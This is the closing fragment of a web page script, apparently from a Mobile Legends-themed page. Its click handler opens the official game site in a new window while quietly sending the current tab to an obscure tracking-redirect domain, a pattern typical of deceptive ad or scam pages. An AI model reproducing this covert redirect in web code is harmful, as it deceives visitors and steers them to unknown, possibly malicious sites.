    $('.nextcarlos').click(function(e) {
        window.open('https://m.mobilelegends.com/en');
        window.location.href='https://dominatedisintegratemarinade.com/keq2tktwt3?key=03f26846b6989461e8f2e2cff1795d27';
    });
});

var buka = new Audio();
buka.src = "https://rawcdn.githack.com/AlexHostX/all.asset/d1a42a80f01064a559cb0ce4e5ec0474091c651f/click.mp3";

var tutup = new Audio();
tutup.src = "alxFrontEnd/unclick.mp3";
</script>
    </body>
</html>